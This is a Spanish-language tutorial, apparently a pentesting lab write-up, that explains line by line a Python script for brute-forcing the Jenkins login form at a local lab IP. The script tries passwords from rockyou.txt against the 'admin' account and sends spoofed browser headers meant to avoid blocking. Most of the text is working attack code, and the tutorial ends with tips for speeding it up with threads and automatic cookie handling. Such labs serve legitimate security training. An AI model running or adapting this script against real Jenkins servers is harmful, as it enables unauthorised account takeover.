
---

#KaliLinux #VirtualBox #Jenkins #Pentesting #BurpSuite #FuerzaBruta #EthicalHacking #Python #CyberSecurity #Rockyou #Requests #Automatización #SeguridadInformática

---

## **Importación de librerías**

```python
import requests
import signal
import sys
```

- `requests`: Permite enviar solicitudes HTTP al servidor Jenkins.
- `signal`: Facilita la captura de señales del sistema para manejar interrupciones.
- `sys`: Permite la terminación controlada del programa en caso de una interrupción manual (`Ctrl + C`).

---

## **Manejo de interrupción (`Ctrl + C`)**

```python
def salir(sig, frame):
    print("\nSaliendo del programa de forma segura...")
    sys.exit(0)  # Salida limpia

signal.signal(signal.SIGINT, salir)
```

- Define la función `salir()`, que se ejecutará cuando el usuario presione `Ctrl + C`.
- `signal.signal(signal.SIGINT, salir)`: Captura la señal `SIGINT` (interrupción manual con `Ctrl + C`) y ejecuta `salir()` para detener el script de forma segura.

---

## **Configuración del objetivo**

```python
url = 'http://172.17.0.2:8080/j_spring_security_check'
diccionario_password = 'rockyou.txt'
```

- `url`: Define el endpoint de autenticación de Jenkins (`/j_spring_security_check`).
- `diccionario_password`: Nombre del archivo que contiene las contraseñas a probar (`rockyou.txt`).

---

## **Cabeceras HTTP**

```python
cabeceras = {
    'Host': '172.17.0.2:8080',
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate, br',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://172.17.0.2:8080',
    'Connection': 'keep-alive',
    'Referer': 'http://172.17.0.2:8080/login?from=%2F',
    'Cookie': 'JSESSIONID.b04dbd66=node01f6mvw75o6x2n159uzu5n0hqng1.node0',
    'Upgrade-Insecure-Requests': '1',
    'Priority': 'u=1'
}
```

- Simula una solicitud legítima de un navegador.
- `User-Agent`: Se hace pasar por un navegador real para evitar bloqueos.
- `Cookie`: Contiene una sesión previa de Jenkins, que podría ser útil para autenticación.
- `Referer`: Indica de dónde proviene la solicitud (el formulario de inicio de sesión de Jenkins).
- `Content-Type`: Especifica que los datos se enviarán en formato de formulario.

---

## **Apertura del diccionario de contraseñas y fuerza bruta**

```python
with open(diccionario_password, 'r', encoding='latin-1') as file:
    for line in file:
        password_sin_espacios = line.strip()
```

- Abre el archivo `rockyou.txt` en modo lectura (`'r'`).
- Usa `strip()` para eliminar espacios o saltos de línea en las contraseñas.

---

## **Construcción de la solicitud de autenticación**

```python
        acceso = {
            'j_username': 'admin',
            'j_password': password_sin_espacios,
            'from': '/',
            'submit': '/'
        }
```

- Crea un diccionario `acceso` con los datos del formulario de autenticación:
    - `j_username`: Usuario (fijo en `"admin"`).
    - `j_password`: La contraseña actual del diccionario.
    - `from`: Indica que se intenta iniciar sesión desde la página principal (`/`).
    - `submit`: Valor enviado al hacer clic en "Iniciar sesión".

---

## **Envío de la solicitud POST**

```python
        respuesta = requests.post(url, headers=cabeceras, data=acceso, allow_redirects=False)
```

- Usa `requests.post()` para enviar la solicitud de login a Jenkins.
- `headers=cabeceras`: Envía las cabeceras para simular una petición legítima.
- `data=acceso`: Envía los datos del formulario con la contraseña actual.
- `allow_redirects=False`: Evita que la solicitud siga redirecciones automáticamente.

---

## **Verificación de la autenticación**

```python
        if respuesta.status_code == 302 and respuesta.headers.get('Location') != 'http://172.17.0.2:8080/loginError':
            print(f"Login correcto con el usuario admin y contraseña {password_sin_espacios}")
            break
        else:
            print(f"Contraseña fallida: {password_sin_espacios}")
```

- Jenkins responde con un **código 302** si la autenticación es exitosa o fallida.
- **Caso de éxito**:
    - Si la respuesta **NO** redirige a `/loginError`, significa que el login fue exitoso.
    - Muestra la contraseña correcta y **detiene el ataque** (`break`).
- **Caso de fallo**:
    - Si la respuesta redirige a `/loginError`, la contraseña es incorrecta.
    - Muestra la contraseña fallida y pasa a la siguiente.

---

## **Manejo de interrupciones con `Ctrl + C`**

Si el usuario presiona `Ctrl + C`, se ejecuta la función `salir()` definida anteriormente, terminando el script de forma ordenada.

---

### **Resumen**

Este script:

1. **Carga** un diccionario de contraseñas (`rockyou.txt`).
2. **Envía** una solicitud de autenticación a Jenkins con cada contraseña.
3. **Detecta** si el login fue exitoso (código 302 sin redirección a `/loginError`).
4. **Detiene** la ejecución si encuentra la contraseña correcta.
5. **Muestra** las contraseñas fallidas y permite interrumpir el ataque con `Ctrl + C`.

Este tipo de ataques se usa en **pentesting** para evaluar la seguridad de contraseñas en sistemas vulnerables.

---

### **Mejoras posibles**

- **Optimización con múltiples hilos (`threading`)** para probar contraseñas más rápido.
- **Uso de sesiones (`requests.Session()`)** para mantener cookies y mejorar la eficiencia.
- **Detección automática de cookies (`requests.get()`)** para evitar sesiones caducadas.
- **Guardar los intentos fallidos** en un archivo log.

---
